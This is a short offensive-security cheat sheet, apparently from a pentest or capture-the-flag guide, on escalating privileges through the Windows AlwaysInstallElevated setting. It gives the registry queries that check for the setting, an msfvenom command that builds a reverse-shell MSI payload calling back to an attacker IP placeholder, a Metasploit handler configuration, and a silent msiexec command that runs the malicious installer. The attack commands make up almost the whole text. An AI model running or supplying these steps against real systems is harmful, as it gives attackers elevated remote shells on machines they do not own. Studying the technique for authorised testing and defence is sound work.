`.msi` files are ***Windows Installer Files that typically run with the user's privilege level that starts it***. However, they can be set to run with elevated privileges from any user account (even unprivileged ones).

This method requires two registry values to be set.
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer 
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
Note: To be able to exploit this vulnerability, ***both should be set***.

**Create a Payload:**
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

**Start a Metasploit Handler to receive the Shell:**
```
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set lhost IP
run
```

**Execute the malicious MSI:**
```
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```
